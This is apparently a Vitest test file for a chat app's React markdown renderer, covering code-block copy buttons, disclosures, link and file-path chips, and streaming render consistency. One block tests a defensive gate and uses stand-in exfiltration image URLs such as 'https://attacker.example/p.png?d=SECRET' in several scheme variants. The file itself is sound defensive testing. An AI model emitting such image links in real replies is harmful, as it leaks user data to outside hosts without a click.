// @vitest-environment jsdom
import '@testing-library/jest-dom/vitest';
import React from 'react';
import { describe, it, expect, afterEach, vi } from 'vitest';
import { render, screen, cleanup, fireEvent } from '@testing-library/react';
import MarkdownContent from './MarkdownContent';
import { SessionRefsEnabled } from './session-refs-context';
import { MARKDOWN_STREAM_CORPUS, tokenDeltas, prefixesOf } from '../../../tests/helpers/markdown-stream-corpus';

// Every source string handed to react-markdown, so the streaming cost pins below
// count real parse+highlight passes. Delegates to the real renderer unchanged.
const markdownRenders = vi.hoisted(() => [] as string[]);
vi.mock('react-markdown', async (importOriginal) => {
  const actual = await importOriginal<typeof import('react-markdown')>();
  return {
    ...actual,
    default: (props: { children?: string }) => {
      markdownRenders.push(String(props.children ?? ''));
      return (actual.default as any)(props);
    },
  };
});
// The reference block resolves ids asynchronously; a fixed stand-in keeps the
// streaming comparisons below about markdown, not about a network answer.
vi.mock('./tool-views/ChatsearchRefBlock', () => ({
  default: ({ shortIds }: { shortIds: string[] }) => <div data-refs={shortIds.join(',')} />,
}));

afterEach(cleanup);

// The regression this pins: the Copy button used to be derived from
// `child.props.children` and only accepted a STRING. rehype-highlight replaces
// the code element's text node with a <span> tree as soon as highlight.js
// recognises ANY token, so the button silently disappeared on exactly the
// blocks worth copying — and survived only on blocks the highlighter failed to
// tokenise. The failure is invisible (a missing button looks like a design
// choice), and `bash` flips between the two states depending on whether the
// snippet happens to contain a comment, so a single sample proves nothing.
// Every variant below must behave identically.
const FENCES: { name: string; md: string; code: string }[] = [
  {
    name: 'no language (highlighter emits no tokens)',
    md: '```\nhello world\n```',
    code: 'hello world\n',
  },
  {
    name: 'bash with nothing colourable',
    md: '```bash\nnpm run build\n```',
    code: 'npm run build\n',
  },
  {
    // The load-bearing case: identical to the one above but for a comment
    // line, which is all it took for highlight.js to tokenise and the button
    // to vanish.
    name: 'bash with a comment',
    md: '```bash\n# install first\nnpm run build\n```',
    code: '# install first\nnpm run build\n',
  },
  { name: 'json', md: '```json\n{"a": 1}\n```', code: '{"a": 1}\n' },
  { name: 'python', md: '```python\ndef f(): return 1\n```', code: 'def f(): return 1\n' },
  { name: 'markdown', md: '```markdown\n# Title\n```', code: '# Title\n' },
  {
    name: 'unknown language',
    md: '```foolang\nabc\n```',
    code: 'abc\n',
  },
];

describe('MarkdownContent fenced code blocks', () => {
  for (const f of FENCES) {
    it(`renders a Copy button for ${f.name}`, () => {
      render(<MarkdownContent content={f.md} />);
      expect(screen.getByRole('button', { name: /copy/i })).toBeInTheDocument();
    });

    it(`copies the full source text for ${f.name}`, async () => {
      const writes: string[] = [];
      Object.assign(navigator, {
        clipboard: { writeText: (t: string) => { writes.push(t); return Promise.resolve(); } },
      });
      const { getByRole } = render(<MarkdownContent content={f.md} />);
      getByRole('button', { name: /copy/i }).click();
      // Must be the raw source, not the highlighted markup — the whole point of
      // reading the hast node instead of the rendered children.
      expect(writes).toEqual([f.code]);
    });

    it(`styles ${f.name} as a block, not inline code`, () => {
      const { container } = render(<MarkdownContent content={f.md} />);
      const code = container.querySelector('pre code');
      expect(code).not.toBeNull();
      // text-code is the INLINE styling. A fenced block must never carry it —
      // an unlanguaged fence used to, because "no className" was read as
      // "inline" and an unlanguaged fence gets no class from the highlighter.
      expect(code!.className).not.toContain('text-code');
    });

    it(`keeps the yc-code hook on the <pre> for ${f.name}`, () => {
      const { container } = render(<MarkdownContent content={f.md} />);
      // globals.css out-specifies highlight.js's own `pre code.hljs` box via
      // `pre.yc-code code.hljs`. Drop the class and the double-rectangle
      // regression returns, with nothing else to catch it.
      expect(container.querySelector('pre.yc-code')).not.toBeNull();
    });
  }

  it('leaves inline code as inline', () => {
    const { container } = render(<MarkdownContent content={'some `inline` code'} />);
    expect(container.querySelector('pre')).toBeNull();
    expect(container.querySelector('code')!.className).toContain('text-code');
  });

  it('copies only the block that was clicked when several are present', () => {
    const writes: string[] = [];
    Object.assign(navigator, {
      clipboard: { writeText: (t: string) => { writes.push(t); return Promise.resolve(); } },
    });
    render(<MarkdownContent content={'```json\n{"a": 1}\n```\n\ntext\n\n```python\ndef f(): pass\n```'} />);
    const buttons = screen.getAllByRole('button', { name: /copy/i });
    expect(buttons).toHaveLength(2);
    buttons[1].click();
    expect(writes).toEqual(['def f(): pass\n']);
  });
});

describe('MarkdownContent HTML disclosures', () => {
  const disclosure = [
    '<details>',
    '<summary>Key code evidence</summary>',
    '',
    'The renderer keeps **Markdown** inside the disclosure.',
    '',
    '```ts',
    'const value = 1;',
    '```',
    '',
    '</details>',
  ].join('\n');

  it('renders model-generated details markup as an interactive disclosure', () => {
    const { container } = render(<MarkdownContent content={disclosure} />);
    const details = container.querySelector('details');

    expect(details).not.toBeNull();
    expect(details!.querySelector('summary')).toHaveTextContent('Key code evidence');
    expect(details).toHaveTextContent('The renderer keeps Markdown inside the disclosure.');
    expect(details!.querySelector('strong')).toHaveTextContent('Markdown');
    expect(details!.querySelector('pre code')).toHaveTextContent('const value = 1;');
    expect(container).not.toHaveTextContent('<details>');
    expect(container).not.toHaveTextContent('</details>');
  });

  it('does not expose tags from unsupported HTML blocks', () => {
    const { container } = render(
      <MarkdownContent content={'<aside>\n\nReadable **content**.\n\n</aside>'} />,
    );

    expect(container).toHaveTextContent('Readable content.');
    expect(container).not.toHaveTextContent('<aside>');
    expect(container).not.toHaveTextContent('</aside>');
  });

  it('does not expose or link unsupported HTML attributes', () => {
    const { container } = render(
      <MarkdownContent content={'<span title="> https://example.com">Visible</span>'} />,
    );

    expect(container).toHaveTextContent('Visible');
    expect(container).not.toHaveTextContent('title=');
    expect(container).not.toHaveTextContent('https://example.com');
    expect(container.querySelector('a')).toBeNull();
  });

  it('accepts a blank line between details and summary', () => {
    const spaced = disclosure.replace('<details>\n<summary>', '<details>\n\n<summary>');
    const { container } = render(<MarkdownContent content={spaced} />);

    expect(container.querySelector('details > summary')).toHaveTextContent('Key code evidence');
    expect(container.querySelector('details')).toHaveTextContent('The renderer keeps Markdown inside the disclosure.');
    expect(container).not.toHaveTextContent('</details>');
  });

  it('keeps disclosure markup non-interactive in preview mode', () => {
    const { container } = render(<MarkdownContent content={disclosure} preview />);

    expect(container.querySelector('details')).toBeNull();
    expect(container).toHaveTextContent('Key code evidence');
    expect(container).toHaveTextContent('The renderer keeps Markdown inside the disclosure.');
    expect(container).not.toHaveTextContent('</details>');
  });
});

// ---------------------------------------------------------------------------
// Clickable URLs and file paths.
// The regression this pins: a URL inside backticks (`http://127.0.0.1:8931/`)
// rendered as dead text. remark-gfm only autolinks BARE urls in prose, so
// anything Claude wrapped in code — inline or fenced — could not be clicked.
// ---------------------------------------------------------------------------
describe('MarkdownContent links', () => {
  const hrefs = (c: HTMLElement) =>
    Array.from(c.querySelectorAll('a')).map((a) => a.getAttribute('href'));

  it('links a bare URL in prose', () => {
    const { container } = render(<MarkdownContent content={'see https://example.com now'} />);
    expect(hrefs(container)).toEqual(['https://example.com']);
  });

  it('links a URL inside inline code', () => {
    const { container } = render(<MarkdownContent content={'run `http://127.0.0.1:8931/`'} />);
    expect(hrefs(container)).toEqual(['http://127.0.0.1:8931/']);
    // The link must still LOOK like the code it was written as.
    expect(container.querySelector('code a')).not.toBeNull();
  });

  it('links a URL inside a fenced code block', () => {
    const { container } = render(
      <MarkdownContent content={'```\nopen http://127.0.0.1:8931/\n```'} />,
    );
    expect(hrefs(container)).toEqual(['http://127.0.0.1:8931/']);
    expect(container.querySelector('pre a')).not.toBeNull();
  });

  it('links a URL inside a languaged fenced block (highlighter has already split the text)', () => {
    const { container } = render(
      <MarkdownContent content={'```bash\ncurl https://example.com/api\n```'} />,
    );
    expect(hrefs(container)).toEqual(['https://example.com/api']);
  });

  it('opens links in the system browser, not in the app', () => {
    // target=_blank is what Electron's setWindowOpenHandler turns into
    // shell.openExternal, and what Android's shouldOverrideUrlLoading turns
    // into an ACTION_VIEW intent. Without it the link would navigate the app.
    const { container } = render(<MarkdownContent content={'see https://example.com'} />);
    const a = container.querySelector('a')!;
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('rel')).toContain('noopener');
  });

  it('never nests a link inside a markdown link', () => {
    const { container } = render(
      <MarkdownContent content={'[the docs](https://example.com/docs)'} />,
    );
    expect(hrefs(container)).toEqual(['https://example.com/docs']);
    expect(container.querySelectorAll('a a')).toHaveLength(0);
  });

  it('keeps the URL in what a code block copies', () => {
    const writes: string[] = [];
    Object.assign(navigator, {
      clipboard: { writeText: (t: string) => { writes.push(t); return Promise.resolve(); } },
    });
    const { getByRole } = render(
      <MarkdownContent content={'```\nopen http://127.0.0.1:8931/\n```'} />,
    );
    getByRole('button', { name: /copy/i }).click();
    expect(writes).toEqual(['open http://127.0.0.1:8931/\n']);
  });

  it('links a URL in a table cell, a heading and bold text', () => {
    // Every one of these is a different parent element in the tree; the token
    // splitter works on text nodes, so all of them must behave the same.
    for (const md of [
      '| a |\n| --- |\n| https://example.com |',
      '## https://example.com',
      '**https://example.com**',
      '> https://example.com',
      '- https://example.com',
    ]) {
      const { container, unmount } = render(<MarkdownContent content={md} />);
      expect(hrefs(container), md).toEqual(['https://example.com']);
      unmount();
    }
  });

  it('renders links as plain text in preview mode', () => {
    const { container } = render(
      <MarkdownContent content={'see https://example.com'} preview />,
    );
    expect(container.querySelector('a')).toBeNull();
    expect(container.textContent).toContain('https://example.com');
  });
});

describe('MarkdownContent file paths', () => {
  const paths = (c: HTMLElement) =>
    Array.from(c.querySelectorAll('button[data-file-path]')).map((b) => b.textContent);

  it('makes an absolute path in prose clickable', () => {
    const { container } = render(
      <MarkdownContent content={'open /home/destin/plan.md'} sessionId="s1" />,
    );
    expect(paths(container)).toEqual(['plan.md']);
  });

  it('makes a path inside inline code clickable', () => {
    const { container } = render(
      <MarkdownContent content={'open `~/notes/todo.md`'} sessionId="s1" />,
    );
    expect(paths(container)).toEqual(['todo.md']);
  });

  it('makes a path inside a fenced code block clickable, showing the whole path', () => {
    // In a code block the chip would break the monospace grid and hide the rest
    // of the command, so the token keeps the path exactly as written.
    const { container } = render(
      <MarkdownContent content={'```bash\ncat /home/destin/plan.md\n```'} sessionId="s1" />,
    );
    expect(paths(container)).toEqual(['/home/destin/plan.md']);
  });

  it('keeps the path in what a code block copies', () => {
    const writes: string[] = [];
    Object.assign(navigator, {
      clipboard: { writeText: (t: string) => { writes.push(t); return Promise.resolve(); } },
    });
    const { getByRole } = render(
      <MarkdownContent content={'```bash\ncat /home/destin/plan.md\n```'} sessionId="s1" />,
    );
    getByRole('button', { name: /copy/i }).click();
    expect(writes).toEqual(['cat /home/destin/plan.md\n']);
  });

  it('makes media, archive and script paths clickable, not just readable documents', () => {
    // Before 2026-09-05 only a short list of viewable types pilled, so a path
    // to an .mp3 or a .zip could not be clicked at all.
    for (const [md, label] of [
      ['play /home/d/song.mp3', 'song.mp3'],
      ['watch /home/d/clip.mp4', 'clip.mp4'],
      ['unzip /home/d/bundle.zip', 'bundle.zip'],
      ['run scripts/deploy.sh', 'deploy.sh'],
    ] as const) {
      const { container, unmount } = render(<MarkdownContent content={md} sessionId="s1" />);
      expect(paths(container), md).toEqual([label]);
      unmount();
    }
  });

  it('leaves paths alone when there is no session to resolve them against', () => {
    const { container } = render(<MarkdownContent content={'open /home/destin/plan.md'} />);
    expect(paths(container)).toEqual([]);
    expect(container.textContent).toContain('/home/destin/plan.md');
  });
});

// 2026-09-10 security review (Destin's "tap to show"): a picture from a WEBSITE
// must not load until the person taps Show — its address can carry stolen text,
// so an auto-loaded remote image is a zero-click exfiltration channel. A data:
// image has no network fetch and renders immediately.
describe('remote images wait for a tap; local images render inline', () => {
  it('a website image renders a Show button, not an <img>, until tapped', () => {
    render(<MarkdownContent content={'![cat](https://attacker.example/p.png?d=SECRET)'} />);
    // No <img> has hit the DOM (no request left the machine).
    expect(document.querySelector('img')).toBeNull();
    const btn = screen.getByRole('button', { name: /image from attacker\.example/i });
    expect(btn).toBeInTheDocument();
    fireEvent.click(btn);
    const img = document.querySelector('img');
    expect(img).not.toBeNull();
    expect(img!.getAttribute('src')).toBe('https://attacker.example/p.png?d=SECRET');
  });

  it.each([
    'https://attacker.example/p.png?d=SECRET',
    'https:attacker.example/p.png?d=SECRET',   // no double slash — browser still fetches it
    'https:/attacker.example/p.png?d=SECRET',  // one slash
    'HTTPS://attacker.example/p.png',          // uppercase scheme
    '//attacker.example/p.png',                // protocol-relative
  ])('gates the website image %s behind Show (no <img> until tapped)', (src) => {
    render(<MarkdownContent content={`![x](${src})`} />);
    expect(document.querySelector('img')).toBeNull();
    expect(screen.getByRole('button', { name: /image from|load image/i })).toBeInTheDocument();
  });

  it('a data: image is never gated as a remote fetch (no Show button)', () => {
    // react-markdown's default urlTransform already drops data: srcs, so the
    // point is only that a data: image is NOT treated as a website fetch.
    render(<MarkdownContent content={'![dot](data:image/png;base64,iVBORw0KGgo=)'} />);
    expect(screen.queryByRole('button', { name: /image from/i })).toBeNull();
  });
});

// Streaming (smoothness sweep A5): a growing reply is drawn piece by piece, and
// the page must be byte-for-byte what drawing the whole text at once gives.
describe('MarkdownContent while a reply streams in', () => {
  const Bubble = ({ md, incremental }: { md: string; incremental?: boolean }) => (
    <SessionRefsEnabled.Provider value={true}>
      <MarkdownContent content={md} sessionId="s1" incremental={incremental} />
    </SessionRefsEnabled.Provider>
  );
  // The page as markup with each element's attributes in name order. WHY sorted:
  // React appends an attribute it adds to an EXISTING element (a code block's
  // `class` arriving once its language is typed) after the ones already there,
  // so an element updated in place lists them in a different order than a fresh
  // one. Order carries no meaning to the browser, and today's whole-message
  // render updates in place too; everything else — text nodes included — is
  // compared exactly.
  const canonical = (root: Element): string => Array.from(root.childNodes).map((n) => {
    if (n.nodeType !== 1) return n.nodeType === 3 ? JSON.stringify(n.textContent) : '';
    const el = n as Element;
    const attrs = Array.from(el.attributes).map((a) => `${a.name}=${JSON.stringify(a.value)}`).sort().join(' ');
    return `<${el.tagName.toLowerCase()} ${attrs}>${canonical(el)}</${el.tagName.toLowerCase()}>`;
  }).join('');
  const wholeHtml = (md: string) => {
    const r = render(<Bubble md={md} />);
    const html = canonical(r.container);
    r.unmount();
    return html;
  };
  const streamAndCompare = (md: string, prefixes: string[]) => {
    const live = render(<Bubble md={prefixes[0]} incremental />);
    for (const prefix of prefixes) {
      live.rerender(<Bubble md={prefix} incremental />);
      expect(canonical(live.container), `after ${JSON.stringify(prefix)}`).toBe(wholeHtml(prefix));
    }
    live.unmount();
  };

  for (const sample of MARKDOWN_STREAM_CORPUS) {
    it(`draws "${sample.name}" exactly like the whole message after every delta`, () => {
      streamAndCompare(sample.md, prefixesOf(tokenDeltas(sample.md)));
    });
  }

  // Where a partial last line can change the block above it, go one character
  // at a time: "#" then "#f", "-" then "- x", a header row then its delimiter.
  for (const name of ['setext headings', 'hash that is not a heading, then a real one', 'dashes: setext, rules and list items', 'table appearing under paragraph lines', 'CRLF line endings']) {
    it(`draws "${name}" exactly like the whole message after every character`, () => {
      const md = MARKDOWN_STREAM_CORPUS.find((s) => s.name === name)!.md;
      streamAndCompare(md, Array.from({ length: md.length }, (_, i) => md.slice(0, i + 1)));
    });
  }

  it('keeps the elements already on screen instead of replacing them as the reply grows', () => {
    const md = MARKDOWN_STREAM_CORPUS.find((s) => s.name === 'long mixed reply')!.md;
    const prefixes = prefixesOf(tokenDeltas(md));
    const live = render(<Bubble md={prefixes[0]} incremental />);
    live.rerender(<Bubble md={prefixes[1]} incremental />);
    const heading = live.container.querySelector('h2')!;
    expect(heading.textContent).toBe('Plan');
    let firstCode: Element | null = null;
    for (const prefix of prefixes.slice(2)) {
      live.rerender(<Bubble md={prefix} incremental />);
      expect(live.container.querySelector('h2')).toBe(heading);
      firstCode ??= prefix.includes('```json') ? live.container.querySelector('pre') : null;
      if (firstCode) expect(live.container.querySelector('pre')).toBe(firstCode);
    }
    expect(firstCode).not.toBeNull();
    live.unmount();
  });

  it('re-draws only the unfinished paragraph per delta, not the finished code blocks above it', () => {
    const body = MARKDOWN_STREAM_CORPUS.find((s) => s.name === 'long mixed reply')!.md.repeat(3);
    const tailWords = tokenDeltas(' and then some closing words that keep arriving one at a time until the end');
    const live = render(<Bubble md={body.slice(0, 10)} incremental />);
    let md = body;
    live.rerender(<Bubble md={md} incremental />);
    md += '\n\nClosing';
    live.rerender(<Bubble md={md} incremental />);
    markdownRenders.length = 0;
    for (const word of tailWords) {
      md += word;
      live.rerender(<Bubble md={md} incremental />);
    }
    // One react-markdown pass per delta, each over the live paragraph alone.
    expect(markdownRenders).toHaveLength(tailWords.length);
    for (const source of markdownRenders) expect(source.startsWith('Closing')).toBe(true);
    live.unmount();
  });

  // Review F2: a raw-HTML block near the top (a comment, a <br>) used to hold
  // everything below it live, so every word re-parsed the whole reply twice.
  it('re-draws only the unfinished paragraph when raw HTML sits near the top', () => {
    const body = '<!-- note -->\n\nTop <br> line\n\n<br>\n\n' + MARKDOWN_STREAM_CORPUS.find((s) => s.name === 'long mixed reply')!.md.repeat(2);
    const live = render(<Bubble md="<!--" incremental />);
    let md = body;
    live.rerender(<Bubble md={md} incremental />);
    md += '\n\nClosing';
    live.rerender(<Bubble md={md} incremental />);
    markdownRenders.length = 0;
    const words = tokenDeltas(' words that keep arriving one at a time');
    for (const word of words) {
      md += word;
      live.rerender(<Bubble md={md} incremental />);
    }
    expect(markdownRenders).toHaveLength(words.length);
    for (const source of markdownRenders) expect(source.startsWith('Closing')).toBe(true);
    expect(canonical(live.container)).toBe(wholeHtml(md));
    live.unmount();
  });

  it('never draws more per word than the whole message while a disclosure is still open', () => {
    const intro = 'Intro paragraph.\n\n<details>\n<summary>Log</summary>\n\n';
    const inside = MARKDOWN_STREAM_CORPUS.find((s) => s.name === 'long mixed reply')!.md;
    const live = render(<Bubble md="Intro" incremental />);
    let md = intro + inside;
    live.rerender(<Bubble md={md} incremental />);
    for (const word of tokenDeltas(' still inside the open disclosure')) {
      markdownRenders.length = 0;
      md += word;
      live.rerender(<Bubble md={md} incremental />);
      const drawn = markdownRenders.reduce((n, s) => n + s.length, 0);
      expect(drawn).toBeLessThanOrEqual(md.length);
      expect(canonical(live.container)).toBe(wholeHtml(md));
    }
    // Closing it pairs the whole run into one real disclosure, as the whole render does.
    for (const word of tokenDeltas('\n\n</details>\n\nAfter it.')) {
      md += word;
      live.rerender(<Bubble md={md} incremental />);
      expect(canonical(live.container)).toBe(wholeHtml(md));
    }
    expect(live.container.querySelector('details > summary')?.textContent).toBe('Log');
    live.unmount();
  });

  // Review F3: the streaming view is state updated during render, so a render
  // React discards (StrictMode runs every render twice) leaves nothing stale.
  it('draws the same page under StrictMode, and when the content is replaced then grows again', () => {
    const md = MARKDOWN_STREAM_CORPUS.find((s) => s.name === 'fenced code with a language')!.md;
    const Strict = ({ text }: { text: string }) => <React.StrictMode><Bubble md={text} incremental /></React.StrictMode>;
    const prefixes = prefixesOf(tokenDeltas(md));
    const live = render(<Strict text={prefixes[0]} />);
    for (const p of prefixes) {
      live.rerender(<Strict text={p} />);
      expect(canonical(live.container), `after ${JSON.stringify(p)}`).toBe(wholeHtml(p));
    }
    // Replaced (not appended to), then growing again from the new text.
    let next = 'A different reply.\n\n- one\n- two';
    live.rerender(<Strict text={next} />);
    expect(canonical(live.container)).toBe(wholeHtml(next));
    for (const word of tokenDeltas('\n\nThen more\n\n```js\nx()\n```\n\nEnd.')) {
      next += word;
      live.rerender(<Strict text={next} />);
      expect(canonical(live.container), `after ${JSON.stringify(next)}`).toBe(wholeHtml(next));
    }
    live.unmount();
  });

  it('draws a message that never grows (history) as one document, with no split', () => {
    const md = MARKDOWN_STREAM_CORPUS.find((s) => s.name === 'long mixed reply')!.md;
    markdownRenders.length = 0;
    render(<Bubble md={md} incremental />);
    expect(markdownRenders).toEqual([md]);
  });

  // Review F1: content already on screen must never be replaced by a fresh copy
  // as the reply grows — a replaced element loses what the person did to it (a
  // tapped-to-load picture goes back to its placeholder, an opened disclosure
  // snaps shut, a selection vanishes). These hold element identity across
  // updates, not just the markup.
  const tapImage = (root: HTMLElement) => {
    fireEvent.click(screen.getByRole('button', { name: /image from/i }));
    const img = root.querySelector('img');
    expect(img).not.toBeNull();
    return img!;
  };
  // The whole-message page with its picture tapped open, for comparison.
  const wholeTappedHtml = (md: string) => {
    const r = render(<Bubble md={md} />);
    fireEvent.click(r.container.querySelector('button[title^="Load image"]')!);
    const html = canonical(r.container);
    r.unmount();
    return html;
  };
  const paragraph = (root: HTMLElement, text: string) =>
    Array.from(root.querySelectorAll('p')).find((p) => p.textContent === text)!;

  it('keeps what was drawn when the bubble opens with a reply already in progress', () => {
    // Switching back to a session mid-reply mounts the bubble on a long prefix.
    let md = 'Intro\n\n![pic](https://x.com/p.png)\n\npara\n\nmore\n\nnext';
    const live = render(<Bubble md={md} incremental />);
    const img = tapImage(live.container);
    const para = paragraph(live.container, 'para');
    for (const delta of tokenDeltas(' word and on\n\nA new paragraph arrives\n\n```js\nlet x = 1;\n```\n\nThe end.')) {
      md += delta;
      live.rerender(<Bubble md={md} incremental />);
      expect(live.container.querySelector('img'), `after ${JSON.stringify(md)}`).toBe(img);
      expect(paragraph(live.container, 'para')).toBe(para);
    }
    expect(canonical(live.container)).toBe(wholeTappedHtml(md));
    live.unmount();
  });

  it('keeps what was drawn when a link definition arrives mid-reply', () => {
    const full = 'Intro\n\n![pic](https://x.com/p.png)\n\nSee [docs] and [more].\n\nplain words\n\n[docs]: https://example.com/docs\n\nTail [more]\n\n[more]: https://example.com/more\n\nEnd.';
    const prefixes = prefixesOf(tokenDeltas(full));
    const cut = prefixes.findIndex((p) => p.includes('plain words'));
    const live = render(<Bubble md={prefixes[0]} incremental />);
    for (const p of prefixes.slice(1, cut + 1)) live.rerender(<Bubble md={p} incremental />);
    const img = tapImage(live.container);
    const plain = paragraph(live.container, 'plain words');
    for (const p of prefixes.slice(cut + 1)) {
      live.rerender(<Bubble md={p} incremental />);
      expect(live.container.querySelector('img'), `after ${JSON.stringify(p)}`).toBe(img);
      expect(paragraph(live.container, 'plain words')).toBe(plain);
      expect(canonical(live.container), `after ${JSON.stringify(p)}`).toBe(wholeTappedHtml(p));
    }
    // The definitions took effect in the blocks above them.
    expect(live.container.querySelector('a[href="https://example.com/docs"]')).not.toBeNull();
    expect(live.container.querySelector('a[href="https://example.com/more"]')).not.toBeNull();
    live.unmount();
  });
});
